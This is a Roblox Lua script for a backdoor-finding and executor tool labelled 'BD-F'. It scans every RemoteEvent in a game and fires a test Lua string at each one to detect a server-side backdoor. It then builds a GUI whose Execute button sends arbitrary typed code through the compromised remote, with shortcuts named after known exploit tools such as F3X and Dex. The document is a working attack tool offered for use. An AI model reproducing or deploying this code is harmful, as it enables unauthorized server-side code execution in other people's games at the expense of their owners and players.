cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
LocalScript2 = Instance.new("LocalScript")
TextLabel3 = Instance.new("TextLabel")
LocalScript4 = Instance.new("LocalScript")
ObjectValue5 = Instance.new("ObjectValue")
Frame6 = Instance.new("Frame")
ScrollingFrame7 = Instance.new("ScrollingFrame")
TextButton8 = Instance.new("TextButton")
TextButton9 = Instance.new("TextButton")
TextButton10 = Instance.new("TextButton")
TextButton11 = Instance.new("TextButton")
TextBox12 = Instance.new("TextBox")
TextLabel13 = Instance.new("TextLabel")
LocalScript14 = Instance.new("LocalScript")
TextButton15 = Instance.new("TextButton")
LocalScript16 = Instance.new("LocalScript")
TextButton17 = Instance.new("TextButton")
LocalScript18 = Instance.new("LocalScript")
TextButton19 = Instance.new("TextButton")
LocalScript20 = Instance.new("LocalScript")
ScreenGui0.Name = "zza"
ScreenGui0.Parent = mas
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Name = "LoadingUI"
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.499078393, 0, 0.499235392, 0)
Frame1.Size = UDim2.new(0, 301, 0, 100)
Frame1.Active = true
Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
Frame1.BackgroundColor = BrickColor.new("Institutional white")
Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame1.ZIndex = 0
LocalScript2.Parent = Frame1
table.insert(cors,function()
local txt = script.Parent.Status

txt.Text = [[Initialized!
Finding all RemoteEvents..
.Find RE backdoor
.Pass backdoored RE
.Load MainUI with fancy anims]]

wait(1)

local remotes = {}
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("RemoteEvent") then
		print("Found remote: game."..v:GetFullName())
		remotes[i] = v
	end
end

txt.Text = [[Initialized!
Found all RemoteEvents!
Finding a backdoor..
.Pass backdoored RE
.Load MainUI with fancy anims]]

wait(0.1)

for i,remote in pairs(remotes) do
	remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
	wait(0.5)
	if game.ReplicatedStorage:FindFirstChild("i") then
		script.Parent.Parent.re.Value = remote
		txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loading MainUI...]]
		for k,v in pairs(remotes) do
			if v ~= remote then
				table.remove(remotes,table.find(remotes,v))
			end
		end
		game.ReplicatedStorage:FindFirstChild("i"):Destroy()
	end
end

if script.Parent.Parent.re.Value == nil then
	txt.Text = [[Initialized!
Found all RemoteEvents!
Failed to find a backdoor!
.Pass backdoored RE
.Load MainUI with fancy anims]]
	wait(5)
	script.Disabled = true
	script.Parent.Parent:Destroy()
	return
end

wait(0.2)

txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loaded MainUI!]]

local ts = game:GetService("TweenService")

local tp = UDim2.new(0.5, 0, -1, 0)

local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
local t = ts:Create(script.Parent, ti, {Position = tp})

t:Play()

wait(2)

script.Parent.Parent.MainUI.Visible = true
script.Parent.Parent.MainUI.Active = true

tp = UDim2.new(0.5,0,0.5,0)

t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})

t:Play()

wait(2)

script.Parent:Destroy()
end)
TextLabel3.Name = "Status"
TextLabel3.Parent = Frame1
TextLabel3.Size = UDim2.new(0, 301, 0, 100)
TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor = BrickColor.new("Really black")
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size18
TextLabel3.Text = "Initialized!"
TextLabel3.TextColor = BrickColor.new("Institutional white")
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextSize = 18
TextLabel3.TextWrap = true
TextLabel3.TextWrapped = true
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
LocalScript4.Name = "drag"
LocalScript4.Parent = Frame1
table.insert(cors,function()
--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
--Put this inside of your Frame and configure the speed if you would like.
--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s

local UIS = game:GetService('UserInputService')
local frame = script.Parent
local dragToggle = nil
local dragSpeed = 0.25
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end)
ObjectValue5.Name = "re"
ObjectValue5.Parent = ScreenGui0
Frame6.Name = "MainUI"
Frame6.Parent = ScreenGui0
Frame6.Position = UDim2.new(0.5, 0, -1, 0)
Frame6.Visible = false
Frame6.Size = UDim2.new(0, 248, 0, 147)
Frame6.BackgroundColor = BrickColor.new("Black metallic")
Frame6.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
Frame6.BorderColor = BrickColor.new("Really black")
Frame6.BorderColor3 = Color3.new(0, 0, 0)
Frame6.BorderSizePixel = 0
ScrollingFrame7.Name = "ScriptUI"
ScrollingFrame7.Parent = Frame6
ScrollingFrame7.Position = UDim2.new(0, 266, 0, 0)
ScrollingFrame7.Size = UDim2.new(0, 114, 0, 147)
ScrollingFrame7.Active = true
ScrollingFrame7.BackgroundColor = BrickColor.new("Black")
ScrollingFrame7.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
ScrollingFrame7.BorderColor = BrickColor.new("Really black")
ScrollingFrame7.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame7.BorderSizePixel = 0
ScrollingFrame7.ScrollBarThickness = 6
TextButton8.Name = "f3x"
TextButton8.Parent = ScrollingFrame7
TextButton8.Size = UDim2.new(0, 108, 0, 16)
TextButton8.BackgroundColor = BrickColor.new("Black metallic")
TextButton8.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton8.BorderColor = BrickColor.new("Really black")
TextButton8.BorderColor3 = Color3.new(0, 0, 0)
TextButton8.BorderSizePixel = 0
TextButton8.Font = Enum.Font.Nunito
TextButton8.FontSize = Enum.FontSize.Size14
TextButton8.Text = "F3X"
TextButton8.TextColor = BrickColor.new("Really black")
TextButton8.TextColor3 = Color3.new(0, 0, 0)
TextButton8.TextScaled = true
TextButton8.TextSize = 14
TextButton8.TextWrap = true
TextButton8.TextWrapped = true
TextButton9.Name = "dex"
TextButton9.Parent = ScrollingFrame7
TextButton9.Position = UDim2.new(0, 0, 0, 16)
TextButton9.Size = UDim2.new(0, 108, 0, 16)
TextButton9.BackgroundColor = BrickColor.new("Black metallic")
TextButton9.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton9.BorderColor = BrickColor.new("Really black")
TextButton9.BorderColor3 = Color3.new(0, 0, 0)
TextButton9.BorderSizePixel = 0
TextButton9.Font = Enum.Font.Nunito
TextButton9.FontSize = Enum.FontSize.Size14
TextButton9.Text = "Dex"
TextButton9.TextColor = BrickColor.new("Really black")
TextButton9.TextColor3 = Color3.new(0, 0, 0)
TextButton9.TextScaled = true
TextButton9.TextSize = 14
TextButton9.TextWrap = true
TextButton9.TextWrapped = true
TextButton10.Name = "goner"
TextButton10.Parent = ScrollingFrame7
TextButton10.Position = UDim2.new(0, 0, 0, 32)
TextButton10.Size = UDim2.new(0, 108, 0, 16)
TextButton10.BackgroundColor = BrickColor.new("Black metallic")
TextButton10.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton10.BorderColor = BrickColor.new("Really black")
TextButton10.BorderColor3 = Color3.new(0, 0, 0)
TextButton10.BorderSizePixel = 0
TextButton10.Font = Enum.Font.Nunito
TextButton10.FontSize = Enum.FontSize.Size14
TextButton10.Text = "Goner"
TextButton10.TextColor = BrickColor.new("Really black")
TextButton10.TextColor3 = Color3.new(0, 0, 0)
TextButton10.TextScaled = true
TextButton10.TextSize = 14
TextButton10.TextWrap = true
TextButton10.TextWrapped = true
TextButton11.Name = "h-loversgui"
TextButton11.Parent = ScrollingFrame7
TextButton11.Position = UDim2.new(0, 0, 0, 48)
TextButton11.Size = UDim2.new(0, 108, 0, 16)
TextButton11.BackgroundColor = BrickColor.new("Black metallic")
TextButton11.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton11.BorderColor = BrickColor.new("Really black")
TextButton11.BorderColor3 = Color3.new(0, 0, 0)
TextButton11.BorderSizePixel = 0
TextButton11.Font = Enum.Font.Nunito
TextButton11.FontSize = Enum.FontSize.Size14
TextButton11.Text = "H-LoversGUI"
TextButton11.TextColor = BrickColor.new("Really black")
TextButton11.TextColor3 = Color3.new(0, 0, 0)
TextButton11.TextScaled = true
TextButton11.TextSize = 14
TextButton11.TextWrap = true
TextButton11.TextWrapped = true
TextBox12.Name = "code"
TextBox12.Parent = Frame6
TextBox12.Position = UDim2.new(0, 0, 0, 16)
TextBox12.Size = UDim2.new(0, 248, 0, 98)
TextBox12.BackgroundColor = BrickColor.new("Black")
TextBox12.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextBox12.BorderColor = BrickColor.new("Really black")
TextBox12.BorderColor3 = Color3.new(0, 0, 0)
TextBox12.BorderSizePixel = 0
TextBox12.Font = Enum.Font.SourceSans
TextBox12.FontSize = Enum.FontSize.Size14
TextBox12.Text = ""
TextBox12.TextColor = BrickColor.new("Really black")
TextBox12.TextColor3 = Color3.new(0, 0, 0)
TextBox12.TextSize = 14
TextBox12.TextWrap = true
TextBox12.TextWrapped = true
TextBox12.TextXAlignment = Enum.TextXAlignment.Left
TextBox12.TextYAlignment = Enum.TextYAlignment.Top
TextBox12.ClearTextOnFocus = false
TextLabel13.Name = "name"
TextLabel13.Parent = Frame6
TextLabel13.Size = UDim2.new(0, 248, 0, 17)
TextLabel13.BackgroundColor = BrickColor.new("Institutional white")
TextLabel13.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel13.BackgroundTransparency = 1
TextLabel13.BorderColor = BrickColor.new("Really black")
TextLabel13.BorderColor3 = Color3.new(0, 0, 0)
TextLabel13.BorderSizePixel = 0
TextLabel13.Font = Enum.Font.SourceSans
TextLabel13.FontSize = Enum.FontSize.Size14
TextLabel13.Text = "BD-F (Credits - AlmousMarvelous, QuickQuarnt)"
TextLabel13.TextColor = BrickColor.new("Institutional white")
TextLabel13.TextColor3 = Color3.new(1, 1, 1)
TextLabel13.TextScaled = true
TextLabel13.TextSize = 14
TextLabel13.TextWrap = true
TextLabel13.TextWrapped = true
LocalScript14.Name = "drag"
LocalScript14.Parent = TextLabel13
table.insert(cors,function()
local UIS = game:GetService('UserInputService')
local frame = script.Parent.Parent
local dragToggle = nil
local dragSpeed = 0.5
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end)
TextButton15.Name = "Run"
TextButton15.Parent = Frame6
TextButton15.Position = UDim2.new(0, 7, 0, 119)
TextButton15.Size = UDim2.new(0, 76, 0, 21)
TextButton15.BackgroundColor = BrickColor.new("Black")
TextButton15.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton15.BorderColor = BrickColor.new("Really black")
TextButton15.BorderColor3 = Color3.new(0, 0, 0)
TextButton15.BorderSizePixel = 0
TextButton15.Font = Enum.Font.Nunito
TextButton15.FontSize = Enum.FontSize.Size14
TextButton15.Text = "Execute"
TextButton15.TextColor = BrickColor.new("Really black")
TextButton15.TextColor3 = Color3.new(0, 0, 0)
TextButton15.TextScaled = true
TextButton15.TextSize = 14
TextButton15.TextWrap = true
TextButton15.TextWrapped = true
LocalScript16.Parent = TextButton15
table.insert(cors,function()
script.Parent.MouseButton1Down:Connect(function()
	local code = script.Parent.Parent.code.Text
	local re = script.Parent.Parent.Parent.re.Value

	re:FireServer(code)
	print("fired code")
end)
end)
TextButton17.Name = "Clear"
TextButton17.Parent = Frame6
TextButton17.Position = UDim2.new(0, 87, 0, 119)
TextButton17.Size = UDim2.new(0, 76, 0, 21)
TextButton17.BackgroundColor = BrickColor.new("Black")
TextButton17.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton17.BorderColor = BrickColor.new("Really black")
TextButton17.BorderColor3 = Color3.new(0, 0, 0)
TextButton17.BorderSizePixel = 0
TextButton17.Font = Enum.Font.Nunito
TextButton17.FontSize = Enum.FontSize.Size14
TextButton17.Text = "Clear"
TextButton17.TextColor = BrickColor.new("Really black")
TextButton17.TextColor3 = Color3.new(0, 0, 0)
TextButton17.TextScaled = true
TextButton17.TextSize = 14
TextButton17.TextWrap = true
TextButton17.TextWrapped = true
LocalScript18.Parent = TextButton17
table.insert(cors,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.code.Text = ""
end)
end)
TextButton19.Name = "Exit"
TextButton19.Parent = Frame6
TextButton19.Position = UDim2.new(0, 166, 0, 119)
TextButton19.Size = UDim2.new(0, 76, 0, 21)
TextButton19.BackgroundColor = BrickColor.new("Black")
TextButton19.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton19.BorderColor = BrickColor.new("Really black")
TextButton19.BorderColor3 = Color3.new(0, 0, 0)
TextButton19.BorderSizePixel = 0
TextButton19.Font = Enum.Font.Nunito
TextButton19.FontSize = Enum.FontSize.Size14
TextButton19.Text = "Exit"
TextButton19.TextColor = BrickColor.new("Really black")
TextButton19.TextColor3 = Color3.new(0, 0, 0)
TextButton19.TextScaled = true
TextButton19.TextSize = 14
TextButton19.TextWrap = true
TextButton19.TextWrapped = true
LocalScript20.Parent = TextButton19
table.insert(cors,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent:Destroy()
end)
end)
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
